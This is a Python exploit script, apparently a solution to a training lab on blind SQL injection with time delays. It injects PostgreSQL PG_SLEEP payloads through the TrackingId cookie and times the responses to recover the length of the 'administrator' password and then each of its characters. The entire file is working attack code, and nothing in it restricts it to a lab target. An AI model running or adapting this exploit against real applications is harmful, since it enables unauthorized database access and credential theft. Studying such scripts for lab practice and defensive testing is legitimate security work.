import requests
import string
import sys
import os
import getopt
import urllib.parse


def clear_screen():
  if os.name == 'posix':
    clear_window = os.system('clear')
  else:
    clear_window = os.system('cls')


def get_password_length(url, trackingId, session):
  password_length = 0
  i = 0

  while True:
    # If you get errors or false positives try incrementing the number 
    # in the payload at "THEN PG_SLEEP(10)"
    payload = f"'; SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) = {i}) THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END FROM users--"
    payload = urllib.parse.quote_plus(payload)
    cookies = {
      "TrackingId":trackingId + payload,
      "session":session
      }
    r = requests.get(url, cookies = cookies)

    if int(r.elapsed.total_seconds()) < 5:
      clear_screen()
      print(f"[-] The password length is {password_length} characters long")
      i += 1
      password_length += 1
    else:
      clear_screen()
      print(f"[*] The password length is {password_length} characters long")
      break

  return password_length


def get_password(password_length, url, trackingId, session):
  characters = string.ascii_lowercase + string.digits
  password = ""
  message = "[-] The password for 'administrator' is: "
  clear_screen()
  print(message, end = '', flush = True)

  for i in range(password_length):
    for x in characters:
      # If you get errors or false positives try incrementing the number 
      # in the payload at "THEN PG_SLEEP(10)"
      payload = f"'; SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, {i + 1}, 1) = '{x}') THEN PG_SLEEP(10) ELSE PG_SLEEP(0) END FROM users--"
      payload = urllib.parse.quote_plus(payload)
      cookies = {
        "TrackingId":trackingId + payload,
        "session":session
        }
      r = requests.get(url, cookies = cookies)

      if int(r.elapsed.total_seconds()) >= 10:
        password += x
        print(x, end = '', flush = True)
        break
  clear_screen()

  return f"[*] The password for 'administrator' is: {password}"


def get_cookie(url):
  session = requests.Session()
  if session.get(url).status_code != 200 :
    sys.exit("[!] Error. Status code is not '200'")

  response = session.get(url)
  cookies = session.cookies.get_dict()
  values = list(cookies.values())
  trackingId = values[0]
  session = values[1]

  return trackingId, session 


def main(argv):
  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print("This is the script for:\n'Blind SQL injection with time delays and information retrieval'\n\nUsage: bsqli-4.py -u <url>")
    print("\x1b[?25h")
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
      trackingId, session = get_cookie(url)
    elif opt == "-h":
      print("This is the script for:\n'Blind SQL injection with time delays and information retrieval'\n\nUsage: bsqli-4.py -u <url>")
      print("\x1b[?25h")
      sys.exit()
  password_length = get_password_length(url, trackingId, session)
  password = get_password(password_length, url, trackingId, session)
  print(password)


if __name__ == "__main__":
  # Hide Cursor
  print("\x1b[?25l")
  main(sys.argv[1:])
  # Make cursor visible
  print("\x1b[?25h")
  sys.exit()